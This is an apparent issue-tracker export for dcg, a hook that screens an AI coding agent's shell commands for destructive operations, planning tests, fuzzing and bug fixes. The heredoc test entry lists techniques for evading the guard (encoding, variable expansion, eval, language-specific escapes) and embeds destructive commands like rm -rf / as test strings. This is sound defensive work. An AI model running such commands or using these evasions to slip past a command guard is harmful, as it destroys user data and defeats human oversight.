git_safety_guard-2ta which is integrated into dependency graph"}
{"id":"git_safety_guard-7tg","title":"Epic: Test infrastructure + performance guardrails","description":"# Epic: Test infrastructure + performance guardrails\n\n## Why this epic exists\n\n`dcg` runs on every Bash command. That makes it more like a kernel hook than a typical CLI:\n\n- it must never hang\n- it must never panic\n- it must have bounded worst-case latency\n\nAs we add complex logic (execution-context parsing, heredoc extraction, AST matching, repo scanning), the only sustainable way to maintain trust is to encode invariants and budgets in automated guardrails.\n\n## Goals\n\n1. Property-based tests for core invariants (determinism, idempotence, no panics).\n2. Fuzzing harness for high-risk parsers/tokenizers/extractors.\n3. Performance benchmarks with budgets (fast path and slow path) and CI enforcement.\n4. Regression corpora for:\n   - true positives\n   - false positives\n   - bypass attempts\n   - edge cases\n\n## Non-goals\n\n- Chasing high coverage numbers at the expense of signal.\n- Building a heavy telemetry system (optional later).\n\n## Acceptance criteria (epic-level)\n\n- CI can run a \"core suite\" quickly (unit + integration + key E2E) and a \"deep suite\" on schedule (fuzz/bench/proptest).\n- Performance regressions are caught before release.\n- Any crash found by fuzzing is captured as a repro and turned into a regression test.\n","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T21:07:59.839695889-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:07:59.839695889-05:00"}
{"id":"git_safety_guard-7tg.1","title":"Property-based tests for evaluator invariants (proptest)","description":"## Objective\n\nAdd property-based tests that encode the invariants we never want to regress.\n\n## Target invariants\n\n1. Normalization idempotence:\n   - `normalize(normalize(cmd)) == normalize(cmd)`\n2. Determinism:\n   - evaluating the same input twice yields the same decision and match identity\n3. No panics:\n   - evaluation never panics for arbitrary UTF-8 input\n4. Bounded behavior:\n   - overly large inputs are handled without pathological allocations\n\n## Scope\n\n- Focus on the shared evaluator entrypoint.\n- Keep strategies controlled to avoid CI flakiness.\n- Mark the slowest tests `#[ignore]` and run them in a deeper CI job.\n\n## Acceptance criteria\n\n- Proptest suite exists and runs locally.\n- CI can run a small proptest subset reliably.\n- Any discovered bug results in a reduced regression test.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T21:12:38.559130823-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:38.559130823-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.1","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:09.5251165-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.2","title":"Fuzzing harness for high-risk parsers/tokenizers (cargo-fuzz)","description":"## Objective\n\nAdd fuzz targets for the components most likely to panic or hang:\n\n- hook JSON parsing\n- shell tokenizer / execution-context classifier\n- heredoc extractor\n- shared evaluator entrypoint\n\n## Requirements\n\n- Use `cargo-fuzz` (nightly) with time-limited CI runs.\n- Add at least these fuzz targets:\n  - `evaluate` (full evaluator)\n  - `hook_input` (JSON parser)\n  - `tokenizer` (context classifier)\n  - `heredoc_extract`\n\n## Acceptance criteria\n\n- Fuzz targets run locally.\n- CI runs fuzzing for a bounded time (e.g., 5 minutes per target on schedule).\n- Any found crash becomes a regression test.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T21:12:43.859065882-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:43.859065882-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.2","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:14.712645803-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.3","title":"Performance budgets + benchmark enforcement","description":"## Objective\n\nCodify performance budgets and enforce them in CI so `dcg` stays invisible.\n\n## Budgets to encode\n\n- Fast path (no heredoc/inline): p99 under 500us\n- Slow path (heredoc/inline): p99 under 20ms\n- Absolute max: fail-open beyond 50ms\n\nThese numbers can be revised, but must be explicit.\n\n## Requirements\n\n- Benchmarks for:\n  - quick reject / keyword gating\n  - normalization\n  - pack evaluation\n  - overrides/allowlist\n  - heredoc trigger/extract/AST path\n- A CI job that compares benchmarks to budgets (tolerant of variance).\n\n## Acceptance criteria\n\n- Budgets exist as code constants/config.\n- CI can detect large regressions and fail.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:12:49.116455774-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:49.116455774-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.3","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:19.941175632-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.4","title":"CI workflows: core suite vs deep suite (fuzz/proptest/bench)","description":"## Objective\n\nAdd CI workflows that run the right tests at the right cadence.\n\n## Core suite (per PR)\n\n- `cargo fmt --check`\n- `cargo clippy --all-targets -- -D warnings`\n- `cargo test`\n- selected E2E script coverage\n\n## Deep suite (scheduled or manual)\n\n- proptest ignored tests\n- fuzzing time-limited runs\n- benchmarks with budget checks\n\n## Acceptance criteria\n\n- CI is fast enough for PR iteration.\n- Deep suite can be run without human babysitting.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:12:54.368764056-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:54.368764056-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.4","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:25.153093115-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.5","title":"Regression corpus harness (true/false positives + bypass attempts)","description":"## Objective\n\nCreate and maintain a small, curated corpus of high-signal command cases and a harness that runs them through:\n\n- hook JSON path\n- CLI evaluator path\n\n## Corpus categories\n\n- `true_positives/` (must block)\n- `false_positives/` (must allow)\n- `bypass_attempts/` (must block or warn)\n- `edge_cases/` (must not crash/hang)\n\n## Output/logging requirements\n\n- Harness prints per-case:\n  - description\n  - expected decision\n  - actual decision\n  - rule id when matched\n\n## Acceptance criteria\n\n- Corpus harness runs in CI.\n- Adding a new regression is easy and does not require writing Rust test code each time.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:12:59.634711502-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:59.634711502-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.5","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:30.382488184-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-8wt","title":"Create comprehensive test suite for heredoc detection","description":"## Objective\n\nCreate comprehensive test coverage for heredoc detection and AST-based pattern matching, including unit tests, integration tests, and bypass attempt tests.\n\n## Test Categories\n\n### 1. Unit Tests\n\n#### Heredoc Detection Tests\n- Bash heredoc variants: \u003c\u003cEOF, \u003c\u003c-EOF, \u003c\u003c\u003c, \u003c\u003c'EOF', \u003c\u003c\"EOF\"\n- Python multiline strings as heredocs: python3 -c '''...'''\n- Node.js: node -e '...', node \u003c\u003cEOF\n- Perl: perl -e '...', perl \u003c\u003c'END'\n- Ruby: ruby -e '...', ruby \u003c\u003c~RUBY\n\n#### Language Detection Tests\n- Detection from command prefix (python3, node, ruby, perl, bash)\n- Detection from shebang (#!/usr/bin/env python3)\n- Detection from content heuristics (import statements, require(), etc.)\n- Fallback behavior for unknown languages\n\n#### Pattern Matching Tests\n- Each destructive pattern per language\n- Each safe pattern (things that look dangerous but aren't)\n- Edge cases in quoting and escaping\n- Variable interpolation handling\n\n### 2. Integration Tests\n\n#### Pipeline Tests\n- Full flow from JSON input to block/allow decision\n- Heredoc commands correctly trigger deep analysis\n- Non-heredoc commands still use fast path\n- Performance within latency budget\n\n#### Error Handling Tests\n- Malformed heredoc syntax\n- Unparseable content (binary, corrupted)\n- Unknown languages fall back gracefully\n- Timeout handling\n\n### 3. Bypass Attempt Tests (Security Focus)\n\nThese are CRITICAL - they test the actual attack vectors we're trying to block.\n\n#### Encoding Bypasses\n- Base64 encoded commands in heredocs\n- Hex encoding\n- Unicode obfuscation\n- String concatenation to build dangerous strings\n\n#### Indirection Bypasses\n- Variable expansion: CMD=\"rm\"; ${CMD} -rf\n- Array expansion: arr=(rm -rf /); \"${arr[@]}\"\n- Command substitution: $(echo rm) -rf\n- Eval-based: eval \"dangerous command\"\n\n#### Language-Specific Bypasses\n- Python: __import__, exec(), compile()\n- JavaScript: eval(), Function(), require()\n- Ruby: send(), instance_eval(), Kernel.`\n- Perl: eval, do EXPR, qx//\n\n#### Heredoc Nesting\n- Heredoc containing another heredoc\n- Heredoc with escaped delimiters\n- Heredoc across multiple commands (pipelines)\n\n### 4. False Positive Tests\n\nEnsure we DON'T block legitimate uses:\n- Documentation containing command examples\n- Grep patterns searching for dangerous commands\n- Test files containing example commands\n- Config files with commented dangerous commands\n- bd create with descriptions about dangerous patterns\n\n### 5. Performance Tests\n\n- Latency benchmarks for various command types\n- Memory usage under load\n- Concurrent command checking\n- Large heredoc handling\n\n## Test Infrastructure\n\n### Test Data Directory\n```\ntests/\n  fixtures/\n    heredocs/\n      bash/\n      python/\n      javascript/\n      ruby/\n      perl/\n    bypass_attempts/\n    false_positives/\n```\n\n### Test Macros\n```rust\n// Test that a command is blocked\nassert_blocked!(\"python3 \u003c\u003c 'EOF'\\nimport os; os.system('rm -rf /')\\nEOF\");\n\n// Test that a command is allowed\nassert_allowed!(\"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\");\n\n// Test specific pattern match\nassert_pattern_matches!(\"python\", \"os.system($CMD)\", \"os.system('rm -rf /')\");\n```\n\n## Success Criteria\n\n- 100% coverage of documented attack vectors\n- Zero false positives in false_positive test suite\n- All performance tests pass within budget\n- Clear documentation of what each test validates\n\n## Dependencies\n\n- Integration pipeline must be complete\n- All language patterns must be defined\n- Performance benchmarking infrastructure\n","notes":"Supersedes git_safety_guard-unit (duplicate). If useful, structure unit tests into focused modules: tests/tier1_regex.rs (trigger detection), tests/extraction.rs (heredoc/inline extraction), tests/language_detection.rs, tests/patterns_\u003clang\u003e.rs, tests/false_positives.rs, plus fixtures under tests/fixtures/{heredocs,bypass_attempts,false_positives}. Treat coverage numbers (e.g., \u003e90% lines) as guidance, not a hard gate.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:40:09.282575411-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:15:23.036694833-05:00","dependencies":[{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:40:16.212012296-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-unit","type":"blocks","created_at":"2026-01-07T19:37:43.125748306-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-unit","type":"supersedes","created_at":"2026-01-07T21:15:31.580734421-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e","title":"Epic: Core Pipeline Correctness \u0026 Determinism","description":"# Epic: Core Pipeline Correctness \u0026 Determinism\n\n## Why this epic exists\n\n`dcg` is only useful if it is **correct, predictable, and consistent**:\n\n- Correct: enabled packs actually run when their keywords appear.\n- Predictable: the same input yields the same allow/deny + the same reason.\n- Consistent: hook-mode decisions match `dcg test` and any future \"explain\" tooling.\n\nRight now the codebase has a critical architectural correctness gap:\n\n- Hook mode short-circuits early when the top-level command contains no `git`/`rm` (`src/main.rs:587`).\n- `global_quick_reject` also only checks `git`/`rm` (`src/packs/mod.rs:383`).\n\nAs a result, **non-core packs (docker/kubectl/databases/etc.) are effectively unreachable in real hook traffic**, even if enabled in config. This is a trust-destroying failure mode because the CLI (`dcg test`) *can* report a block while the hook *allows* the same command.\n\nWe also have a determinism gap:\n\n- Pack evaluation order is currently based on iterating a `HashSet` (`src/packs/mod.rs:299+`), which is not stable.\n- If multiple packs would block, the user-visible reason (and sometimes which pack is attributed) can vary run-to-run.\n\nFinally, the project is mid-migration:\n\n- Legacy pattern matching exists in `src/main.rs` and duplicates core pack patterns.\n- Hook input parsing and denial output are duplicated between `src/main.rs` and `src/hook.rs`.\n\nThis epic fixes the above so future features (false-positive immunity, heredoc scanning, AST analysis, explainability) are built on a solid, deterministic foundation.\n\n## Goals\n\n1. **Pack reachability:** if an enabled packâ€™s keywords appear in the command, the pack is actually evaluated in hook mode.\n2. **Deterministic decisions:** stable pack ordering + stable pattern identity in results.\n3. **Single source of truth:** one hook parser and one allow/deny pipeline used by hook mode and CLI test mode.\n4. **Performance preserved:** keep the hot path fast (microseconds) and avoid per-invocation regex compilation.\n5. **Naming alignment:** eliminate `git_safety_guard`/`dcg` naming drift in env vars, scripts, docs, and output.\n\n## Non-goals (for this epic)\n\n- Adding new destructive patterns/categories (handled by the pack/library work).\n- Backwards compatibility guarantees (early-stage project; prefer correctness and clarity).\n\n## Acceptance criteria (epic-level)\n\n- With `containers.docker` enabled, `docker system prune` is blocked in *hook mode* (stdin JSON) and in `dcg test`, with the same pack attribution and stable reason.\n- With `kubernetes.kubectl` enabled, `kubectl delete namespace foo` is blocked similarly.\n- Re-running the same blocked input 100 times yields identical `pack_id`/`pattern_name` attribution.\n- No per-command regex compilation for config overrides on the hot path.\n\n## Notes for future self\n\n- This epic must be completed **before** we trust any new pack work or any UX/\"explain\" features.\n- If we later add a scoring system (severity/precision), this epic should provide the deterministic substrate (stable ordering + stable pattern IDs).\n","status":"open","priority":0,"issue_type":"epic","created_at":"2026-01-07T19:57:03.282180904-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:57:03.282180904-05:00"}
{"id":"git_safety_guard-99e.1","title":"BUG: Non-core packs are unreachable in hook mode (global quick reject)","description":"## Summary\n\nIn hook mode, `dcg` returns early for any command that does not contain `git` or `rm`, which makes all non-core packs (docker/kubectl/databases/etc.) effectively unreachable in real Claude Code hook traffic.\n\nThis is a correctness bug and a trust issue because `dcg test` *can* report a block while the actual hook path silently allows.\n\n## Reproduction (expected vs actual)\n\nPrereq: enable a non-core pack (e.g., `containers.docker`) in config.\n\nInput (hook JSON):\n```json\n{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"docker system prune\"}}\n```\n\n- Expected: DENY (pack `containers.docker`, pattern `system-prune`).\n- Actual (today): ALLOW due to early return at `src/main.rs:587` and `global_quick_reject` only checking `git`/`rm`.\n\n## Root cause\n\n- `src/main.rs:587`: `if quick_reject(\u0026command) \u0026\u0026 global_quick_reject(\u0026command) { return; }`\n- `src/packs/mod.rs:383`: `global_quick_reject` only checks for substrings `git` and `rm`.\n\nSo any command lacking these substrings exits before `REGISTRY.check_command(...)` runs.\n\n## Design constraints\n\n- Must preserve hot-path performance for the 99% case.\n- Must remain correct under arbitrary enabled pack sets.\n\n## Proposed fix options\n\n### Option A (recommended): pack-aware global quick reject\n\n- After loading config, compute enabled packs.\n- Build a fast keyword-gating check that returns â€œdefinitely safe to skip packsâ€ only if the command contains **none** of:\n  - core keywords (`git`, `rm`)\n  - keywords for enabled packs (`docker`, `kubectl`, `psql`, etc.)\n\nImplementation can start simple:\n- iterate the enabled packsâ€™ `Pack.keywords` and `memmem::find` for each keyword\n- (optional later) replace with an Aho-Corasick automaton or `regex::RegexSet` for large keyword sets\n\n### Option B: delete global quick reject, rely on per-pack `might_match`\n\n- Always run `REGISTRY.check_command` (it already keyword-gates per pack).\n- Might be slightly slower but likely still fine; measure.\n\n## Acceptance criteria\n\n1. With `containers.docker` enabled, `docker system prune` is denied in hook mode.\n2. With `kubernetes.kubectl` enabled, `kubectl delete namespace foo` is denied in hook mode.\n3. With `database.postgresql` enabled, destructive SQL strings (if passed directly) are denied when appropriate.\n4. `dcg test` and hook mode agree for the same command.\n5. Add regression tests that would have caught this:\n   - a unit/integration test that runs the hook pipeline on a JSON input and asserts denial for a non-git/rm command.\n\n## Notes\n\nThis bug blocks meaningful work on most non-core packs until fixed.\n","status":"open","priority":0,"issue_type":"bug","created_at":"2026-01-07T19:58:01.855008972-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:58:01.855008972-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.1","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T19:58:01.8564148-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.1.1","title":"Implement pack-aware global quick reject","description":"## Objective\n\nFix the hook pipeline so that enabled non-core packs are evaluated when their keywords appear in the command.\n\n## Background\n\nThe current hook pipeline returns early when the command contains neither `git` nor `rm`, which prevents packs like Docker/Kubernetes/DB from ever running.\n\nSee parent bug for reproduction.\n\n## Root Cause Locations\n\n- `src/main.rs:587`: Early return condition only checks `git`/`rm`\n- `src/packs/mod.rs:383`: `global_quick_reject` only checks for substrings `git` and `rm`\n\n## Implementation Plan\n\n### Phase 1: Simple Keyword Union (MVP)\n\n1. Load config (already done in hook mode) and compute `enabled_pack_ids()`.\n2. Expand enabled categories to concrete pack IDs (use `PackRegistry::expand_enabled`).\n3. Build a **keyword union** from all enabled packs' `Pack.keywords`.\n4. Replace the current early-return condition with:\n   - \"return early only if no enabled pack keywords exist in the command\"\n\n### Suggested Algorithm\n\n```rust\n/// Returns true if the command can be safely skipped (no relevant keywords)\nfn pack_aware_quick_reject(cmd: \u0026str, enabled_keywords: \u0026[\u0026str]) -\u003e bool {\n    // Fast path: use memchr::memmem for each keyword\n    for kw in enabled_keywords {\n        if memchr::memmem::find(cmd.as_bytes(), kw.as_bytes()).is_some() {\n            return false;  // Keyword found, must evaluate packs\n        }\n    }\n    true  // No keywords found, safe to skip\n}\n```\n\n### Phase 2: Aho-Corasick Optimization (if needed)\n\nIf the keyword union grows large (\u003e20 keywords), replace with Aho-Corasick automaton:\n\n```rust\nuse aho_corasick::AhoCorasick;\n\nstatic KEYWORD_AUTOMATON: LazyLock\u003cAhoCorasick\u003e = LazyLock::new(|| {\n    let keywords = collect_all_enabled_keywords();\n    AhoCorasick::new(\u0026keywords).expect(\"valid keywords\")\n});\n\nfn pack_aware_quick_reject(cmd: \u0026str) -\u003e bool {\n    !KEYWORD_AUTOMATON.is_match(cmd)\n}\n```\n\n## Performance Budget\n\n- **Target:** \u003c10Î¼s for quick reject on typical commands\n- **Panic threshold:** \u003e100Î¼s (indicates regression)\n- **Zero allocations** on the hot path after initialization\n\n## Case Sensitivity\n\n- CLI tool names (git, docker, kubectl): case-sensitive (Linux convention)\n- SQL keywords (DROP, DELETE): may need both cases - defer to pack keyword definitions\n\n## Considerations\n\n- Keep this check separate from the legacy `quick_reject` so it's not accidentally constrained to `git`/`rm` again.\n- Build the keyword union once per invocation, ideally without heap churn.\n- Consider word-boundary matching in Phase 3 (see 99e.8) to avoid false triggers on substrings like \"digit\" containing \"git\".\n\n## Acceptance Criteria\n\n- `docker system prune` reaches `REGISTRY.check_command` when docker pack is enabled.\n- `kubectl delete namespace foo` reaches `REGISTRY.check_command` when kubectl pack is enabled.\n- For a command like `ls -la`, the hook returns early (no expensive regex) and remains sub-millisecond.\n- Benchmark shows \u003c10Î¼s for quick reject path.","status":"open","priority":0,"issue_type":"task","created_at":"2026-01-07T19:58:22.543207508-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:19:16.79776441-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.1.1","depends_on_id":"git_safety_guard-99e.1","type":"parent-child","created_at":"2026-01-07T19:58:22.54465821-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.1.2","title":"Add regression tests: hook reaches non-core packs","description":"## Objective\n\nAdd tests that would fail under the current bug (non-core packs unreachable) and pass once fixed.\n\n## Why tests are critical\n\nThis bug is easy to reintroduce during future performance work (e.g., adding new global quick rejects). We need a permanent regression test suite that exercises:\n\n- Hook-mode pipeline (stdin JSON) end-to-end\n- Non-core pack enablement\n- CLI vs hook consistency\n\n## Test plan\n\n### 1) Hook-mode integration test\n\n- Build a JSON input for `tool_name=Bash` and command `docker system prune`.\n- Ensure docker pack is enabled via config for the test (env var override or temp config file).\n- Execute the actual binary in test harness (or call the hook pipeline function directly if exposed).\n- Assert:\n  - stdout contains JSON\n  - `permissionDecision` is `deny`\n  - pack attribution includes `containers.docker` (once deterministic metadata is implemented)\n\n### 2) CLI `dcg test` parity test\n\n- Run `dcg test \"docker system prune\" --with-packs containers.docker`.\n- Assert it reports BLOCKED.\n- (Optionally) ensure hook mode reports the same.\n\n### 3) Negative control\n\n- With docker pack enabled, `docker ps` should ALLOW.\n\n## Acceptance criteria\n\n- Tests fail on current main branch (before bugfix) and pass after.\n- Tests run fast and do not require network.\n","status":"open","priority":0,"issue_type":"task","created_at":"2026-01-07T19:58:43.071778915-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:58:43.071778915-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.1.2","depends_on_id":"git_safety_guard-99e.1","type":"parent-child","created_at":"2026-01-07T19:58:43.073195963-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2","title":"Deterministic pack evaluation + return pattern identity","description":"## Objective\n\nMake allow/deny decisions **deterministic and debuggable** by:\n\n1. Evaluating enabled packs in a stable order.\n2. Returning a stable identifier for the matched rule (pack_id + pattern_name).\n\n## Background\n\n`PackRegistry::check_command` currently iterates enabled packs using a `HashSet` (`src/packs/mod.rs`). HashSet iteration order is not stable, so if multiple packs could block a command the chosen reason/attribution can vary run-to-run.\n\nEven when only one pack blocks, future features (explainability, allowlisting by ID, analytics) require stable pattern identity.\n\n## Proposed changes\n\n### 1) Stable pack ordering\n\n- Expand enabled categories into concrete pack IDs.\n- Sort pack IDs deterministically (e.g., lexicographic) OR define an explicit priority ordering.\n\nRecommended: **explicit ordering tiers**, then lexicographic within tier:\n\n1. `core.*` packs\n2. safety-critical infra packs (disk, permissions)\n3. kubernetes/containers/cloud/infrastructure\n4. database packs\n5. `strict_git` (or decide if strict should be earlier; justify)\n6. package managers\n\nRationale: prefer the most human-relevant reason (e.g., â€œrm -rf on / is extremely dangerousâ€ over generic rm).\n\n### 2) Include `pattern_name` in results\n\n- Extend `Pack::matches_destructive` to return the matched `DestructivePattern` (not just the reason string).\n- Extend `CheckResult` to include:\n  - `pack_id`\n  - `pattern_name` (optional for unnamed patterns)\n  - `reason`\n\n### 3) Keep performance sane\n\n- Deterministic ordering can be precomputed per invocation after config load.\n- Avoid allocations in hot paths; keep `reason` static strings where possible.\n\n## Acceptance criteria\n\n- Running the same blocked input 100 times yields identical `pack_id` + `pattern_name`.\n- If multiple packs match, the chosen attribution is stable and documented.\n- Hook deny output and `dcg test` (once unified) can display `pack_id` and `pattern_name`.\n\n## Follow-ups unlocked\n\n- Allowlisting by `(pack_id, pattern_name)` without forcing users to write regex.\n- `dcg test --explain` can show the exact rule that matched.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T19:59:48.537370468-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:59:48.537370468-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T19:59:48.547707155-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.1","title":"Implement stable pack iteration order","description":"## Objective\n\nEnsure `PackRegistry::check_command` evaluates packs in a deterministic order.\n\n## Implementation notes\n\n- Replace iteration over `HashSet` with a `Vec` of pack IDs.\n- After expanding categories, produce a stable ordered list:\n  - explicit tiering (see parent) OR simple `sort_unstable()` with documented semantics.\n\n## Acceptance criteria\n\n- If multiple packs would block the same command, the same pack is always selected.\n- Ordering is unit-tested.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:06.097069365-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:06.097069365-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.1","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:06.098252353-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.2","title":"Propagate matched pattern metadata (pack_id + pattern_name)","description":"## Objective\n\nReturn the matched pattern identity end-to-end.\n\n## Implementation notes\n\n- Change `Pack::matches_destructive` to return the matched `DestructivePattern` (or its `{reason, name}`) instead of only `reason`.\n- Update `Pack::check` and `PackRegistry::check_command` to include `pattern_name` in the result.\n- Decide representation:\n  - `Option\u003c\u0026'static str\u003e` internally\n  - `Option\u003cString\u003e` in `CheckResult` for output (or keep static via Cow)\n\n## Acceptance criteria\n\n- A block result includes:\n  - `pack_id`\n  - `pattern_name` (when defined)\n  - `reason`\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:11.130270969-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:11.130270969-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.2","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:11.131660786-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.2.3","title":"Add deterministic attribution + pattern identity tests","description":"## Objective\n\nAdd tests that enforce determinism and pattern identity.\n\n## Test plan\n\n- Construct an input that matches multiple packs (or multiple patterns) and assert the chosen `pack_id/pattern_name` is stable.\n- Add a snapshot-style test for `dcg test` output once CLI/hook are unified.\n\n## Acceptance criteria\n\n- Tests fail if iteration order becomes nondeterministic.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:16.16252083-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:08:21.658765479-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2","type":"parent-child","created_at":"2026-01-07T20:00:16.163714999-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2.1","type":"blocks","created_at":"2026-01-07T20:13:24.386751714-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.2.3","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:13:29.421657486-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3","title":"Unify hook pipeline (single parser/output); retire legacy matcher","description":"## Objective\n\nReduce duplication and inconsistency by making hook-mode and CLI-mode use a single, shared pipeline:\n\n- One hook input parser\n- One normalization step\n- One decision engine (packs + overrides + context layers)\n- One denial output formatter\n\nThen retire the legacy SAFE/DESTRUCTIVE pattern logic currently duplicated in `src/main.rs`.\n\n## Background\n\nToday the repo has:\n\n- Hook parsing duplicated in `src/main.rs` and in `src/hook.rs`.\n- Deny output duplicated (`deny()` and `hook::output_denial`).\n- Legacy patterns in `src/main.rs` that overlap with `core.git` and `core.filesystem` packs.\n\nThis increases maintenance burden and risks divergence:\n\n- The same command may be treated differently depending on which path is used.\n- Fixes may be applied to packs but not legacy, or vice versa.\n\n## Proposed approach\n\n1. Expose a single internal function like `evaluate_command(config, raw_command) -\u003e Decision`.\n2. Hook mode:\n   - parse input via `hook::read_hook_input` / `hook::extract_command`\n   - call evaluator\n   - on deny: use `hook::output_denial`\n3. CLI `dcg test`:\n   - normalize and call evaluator\n   - print human output\n\n4. Retire legacy patterns:\n   - Ensure `core.git` + `core.filesystem` packs fully cover the legacy patterns.\n   - Remove the legacy SAFE_PATTERNS/DESTRUCTIVE_PATTERNS code path.\n\n## Acceptance criteria\n\n- Hook mode and `dcg test` agree on allow/deny for all existing E2E cases.\n- Unit tests cover the shared evaluator (no hidden behavior in `main`).\n- No duplicate deny formatting code remains.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:33.342948016-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:33.342948016-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:00:33.3440917-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.1","title":"Create shared evaluator API (hook + CLI)","description":"## Objective\n\nImplement a single internal evaluation entry point used by both hook mode and CLI.\n\n## Requirements\n\n- Inputs:\n  - raw command string\n  - loaded config\n  - enabled packs (expanded)\n- Outputs:\n  - Allow / Deny\n  - Deny includes `pack_id`, `pattern_name`, `reason`\n\n## Acceptance criteria\n\n- Hook and CLI can both call the evaluator without re-implementing parsing.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:52.440864652-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:52.440864652-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.1","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:00:52.442017573-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.2","title":"Refactor hook-mode main() to use src/hook.rs","description":"## Objective\n\nMake hook mode use `hook::read_hook_input`, `hook::extract_command`, and `hook::output_denial`.\n\n## Acceptance criteria\n\n- `src/main.rs` no longer defines its own HookInput/HookOutput structs.\n- Denials always go through `hook::output_denial`.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:57.473147495-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:57.473147495-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.2","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:00:57.474491536-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:12:54.191454699-05:00","created_by":"ubuntu"}]}
